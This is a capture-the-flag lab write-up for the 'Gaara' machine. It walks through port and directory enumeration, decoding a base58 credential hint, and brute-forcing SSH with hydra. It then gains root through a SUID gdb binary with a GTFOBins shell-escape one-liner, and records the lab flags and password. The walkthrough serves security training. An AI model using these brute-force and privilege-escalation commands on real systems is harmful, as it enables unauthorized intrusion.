# Gaara

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.158.142
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.158.142/gaara.jpg`

The root path served a simple webpage containing `gaara.jpg`. The image contained an email address — `dyuuwijaya@yahoo.com` — which was a possible username.

Downloaded the image and ran `exiftool`, but nothing important was found. Attempted to brute-force SSH login with the username `dyuuwijaya`, but no valid passwords were found.

Performed directory busting with a different wordlist:

```
feroxbuster --url http://192.168.158.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The path `/Cryoserver` was found. Exploring it revealed references to three subdirectories: `/Temari`, `/Kazekage`, and `/iamGaara`. The first two returned nothing, but `/iamGaara` contained a hidden string:

```
f1MgN9mTf9SNbzRygcU
```

CyberChef was used with this string and it was determined to be base58 encoded, which decoded to:

```
gaara:ismyname
```

Attempted SSH login with these credentials, but they were rejected. Continued brute-forcing SSH with `hydra`:

```
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.158.142
[22][ssh] host: 192.168.158.142   login: gaara   password: iloveyou2
```

Logged in via SSH:

```
ssh gaara@192.168.158.142
gaara@192.168.158.142's password: iloveyou2

gaara@lab-pg-debian10-gaara-243-108:~$ whoami
gaara
```

Retrieved the local flag:

```
gaara@lab-pg-debian10-gaara-243-108:~$ cat local.txt
c7ad581f7bd17f31be16f15d1112c85c
```

## Privilege escalation

Uploaded `linpeas.sh` via `scp`:

```
scp linpeas.sh.txt gaara@192.168.240.230:/tmp
```

Ran `linpeas.sh`. Noted that `copyfail` and `DirtyFrag` did not work.

The key finding was a SUID binary:

```
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb
```

Gained a privileged shell using `gdb` via GTFOBins:

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

# whoami
root
```

Retrieved the proof flag:

```
# cd /root
# cat proof.txt
e6b4bc24ce6dc5f870b440d669bbfc6f
```
